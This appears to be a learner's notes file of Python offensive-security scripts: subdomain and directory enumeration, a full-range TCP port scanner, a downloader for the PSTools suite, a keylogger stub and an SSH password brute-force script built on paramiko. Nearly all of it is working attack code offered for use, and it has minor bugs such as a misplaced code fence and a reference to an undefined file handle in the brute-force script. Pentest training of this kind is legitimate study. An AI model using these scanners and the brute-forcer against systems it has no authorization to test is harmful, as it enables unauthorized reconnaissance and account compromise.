## Subdomain Enumeration
import requests 
import sys 
```

if len(sys.argv) != 2:
    print(f"Usage: python {sys.argv[0]} <root-domain>")
    sys.exit(1)

root_domain = sys.argv[1].strip()

with open("wordlist2.txt") as f:
    subdoms = [line.strip() for line in f]

for sub in subdoms:
    sub_domain = f"http://{sub}.{root_domain}"

    try:
        response = requests.get(sub_domain)
        if response.status_code < 400:
            print(f"Valid domain: {sub_domain}")
    
    except requests.ConnectionError: 
        pass
```

### Directory Enumeration
```
import requests 
import sys 

if len(sys.argv) != 2:
    print(f"Usage: python {sys.argv[0]} <root-domain>")
    sys.exit(1)

root_domain = sys.argv[1].strip()

with open("wordlist2.txt") as f:
    subdoms = [line.strip() for line in f]

for sub in subdoms:
    sub_domain = f"http://{root_domain}/{sub}.html"

    response = requests.get(sub_domain)
    r_code = response.status_code
    if response.status_code == 404:
        pass
    else:
        print("Valid directory:" ,sub, f"{r_code}")

```

### Port Scanner
```
import sys
import socket
import pyfiglet


ascii_banner = pyfiglet.figlet_format("Port Scanner")
print(ascii_banner)


if len(sys.argv) != 2:
    print("Usage: python port_scanner.py <ip-address>")
    sys.exit(1)

ip = sys.argv[1] 
open_ports =[] 

ports = range(1, 65535)


def probe_port(ip, port, result = 1): 
  try: 
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    sock.settimeout(0.5) 
    r = sock.connect_ex((ip, port))   
    if r == 0: 
      result = r 
    sock.close() 
  except Exception as e: 
    pass 
  return result


for port in ports: 
    sys.stdout.flush() 
    response = probe_port(ip, port) 
    if response == 0: 
        open_ports.append(port) 
    

if open_ports: 
  print ("Open Ports are: ") 
  print (sorted(open_ports)) 
else: 
  print ("Looks like no ports are open :(")

```

### File Downloader
```
import requests

url = 'https://download.sysinternals.com/files/PSTools.zip'
r = requests.get(url, allow_redirects=True)
open('PSTools.zip', 'wb').write(r.content)  
```

### HashCracker
- check the scripts

### Keyloggers

**note**: Possible project
```
pip3 install keyboard
```

```
python
import keyboard
keys = keyboard.record(until ='ENTER')
keyboard.play(keys)
```

SSH Bruteforce Scripts

```
import paramiko
import sys
import os

target = str(input('Please enter target IP address: '))
username = str(input('Please enter username to bruteforce: '))
password_file = str(input('Please enter location of the password file: '))

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

with open(password_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        
        try:
            response = ssh_connect(password)

            if response == 0:
                 print('password found: '+ password)
                 exit(0)
            elif response == 1: 
                print('no luck')
        except Exception as e:
            print(e)
        pass

input_file.close()
```
